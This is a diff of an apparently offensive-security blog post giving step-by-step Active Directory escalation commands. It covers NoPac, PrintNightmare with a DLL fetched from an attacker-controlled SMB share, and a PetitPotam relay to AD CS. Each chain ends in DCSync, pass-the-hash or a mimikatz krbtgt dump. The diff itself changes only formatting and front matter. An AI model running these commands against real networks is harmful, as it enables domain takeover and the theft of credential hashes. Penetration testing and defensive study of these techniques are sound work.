@@ -1,17 +1,16 @@
 ---
-title: "Bleeding-Edge & Coercion"
+title: Bleeding-Edge & Coercion
 date: 2026-06-30 20:53:03
+
 categories:
   - Active Directory
   - Exploitation
-  - "Bleeding-Edge & Coercion"
+  - Bleeding-Edge & Coercion
+
 tags:
-  - secretsdump
-  - Privilege-Escalation
   - Windows
-  - Mimikatz
-  - Rubeus
   - Active-Directory
+  - Privilege-Escalation
   - Domain-Escalation
   - NoPac
   - CVE-2021-42278
@@ -24,20 +23,28 @@ tags:
   - ADCS
   - NTLM-Relay
   - PKINIT
+  - Rubeus
+  - Mimikatz
   - ntlmrelayx
   - PKINITtools
   - DCSync
+  - secretsdump
   - NetExec
   - Impacket
   - Print-Spooler
   - Certificate-Abuse
+
+cover: /img/ad-privilege-escalation.png
+top_img: /img/bg-img.jpg
+description: Learn how to escalate privileges in Active Directory by exploiting NoPac, PrintNightmare, and PetitPotam to obtain Domain Admin access using Linux and Windows tools.
 ---
 
-> ➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin.
+
+> ➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin. 
 
 ## NoPac (CVE-2021-42278 / 42287)
 
-> ➜ NoPac chains two bugs: we rename a machine account we create to match the DC’s name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.
+> ➜ NoPac chains two bugs: we rename a machine account we create to match the DC's name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.
 
 #### Setup
 
@@ -69,7 +76,7 @@ sudo python3 noPac.py <DOMAIN>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_HOST> -
 
 ##### DCSync Straight to a Dump
 
-> ➜ Skip the shell and dump the administrator’s hash directly via DCSync.
+> ➜ Skip the shell and dump the administrator's hash directly via DCSync.
 
 ```bash
 sudo python3 noPac.py <DOMAIN>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
@@ -91,13 +98,13 @@ git clone https://github.com/cube0x0/CVE-2021-1675.git
 
 ##### Remove the Default Impacket
 
-> ➜ This exploit requires cube0x0’s Impacket fork, so uninstall the current one first.
+> ➜ This exploit requires cube0x0's Impacket fork, so uninstall the current one first.
 
 ```bash
 pip3 uninstall impacket
 ```
 
-##### Clone cube0x0’s Impacket
+##### Clone cube0x0's Impacket
 
 > ➜ Clone the required fork.
 
@@ -105,9 +112,9 @@ pip3 uninstall impacket
 git clone https://github.com/cube0x0/impacket
 ```
 
-##### Install cube0x0’s Impacket
+##### Install cube0x0's Impacket
 
-> ➜ Install the fork so the exploit’s RPC calls work.
+> ➜ Install the fork so the exploit's RPC calls work.
 
 ```bash
 cd impacket && sudo python3 ./setup.py install
@@ -147,6 +154,7 @@ sudo smbserver.py -smb2support CompData /path/to/dll/
 sudo python3 CVE-2021-1675.py <DOMAIN>/<user>:<pass>@<DC_IP> '\\<attacker>\CompData\backupscript.dll'
 ```
 
+
 ## PetitPotam → ADCS Relay (CVE-2021-36942)
 
 > ➜ Coercion means forcing a machine to authenticate to us, PetitPotam coerces the DC to authenticate and we relay that authentication to the AD CS web-enrollment endpoint to request a certificate as the DC which we then use to DCSync.
@@ -155,7 +163,7 @@ sudo python3 CVE-2021-1675.py <DOMAIN>/<user>:<pass>@<DC_IP> '\\<attacker>\CompD
 
 ##### Relay the DC Auth to the CA
 
-> ➜ Stand up the relay against the CA’s web-enrollment endpoint and request a DomainController certificate.
+> ➜ Stand up the relay against the CA's web-enrollment endpoint and request a DomainController certificate.
 
 ```bash
 sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
@@ -187,17 +195,17 @@ export KRB5CCNAME=dc01.ccache
 
 ##### DCSync the Domain
 
-> ➜ DCSync the administrator using the DC’s ticket.
+> ➜ DCSync the administrator using the DC's ticket.
 
 ```bash
 secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_FQDN>"
 ```
 
-#### Alternative — Recover the DC’s NT Hash
+#### Alternative — Recover the DC's NT Hash
 
 ##### Extract the NT Hash
 
-> ➜ Submit a TGS request for ourselves to recover the DC machine account’s NT hash from the TGT.
+> ➜ Submit a TGS request for ourselves to recover the DC machine account's NT hash from the TGT.
 
 ```bash
 python3 /opt/PKINITtools/getnthash.py -key <AS-REP_KEY> <DOMAIN>/<DC_NAME>\$
@@ -210,6 +218,7 @@ python3 /opt/PKINITtools/getnthash.py -key <AS-REP_KEY> <DOMAIN>/<DC_NAME>\$
 ```bash
 nxc smb <DC_IP> -u <DC_NAME>$ -H <NT_HASH>
 ```
+
 
 #### Windows Path
 
@@ -228,3 +237,5 @@ nxc smb <DC_IP> -u <DC_NAME>$ -H <NT_HASH>
 ```powershell
 .\mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt" exit
 ```
+
+
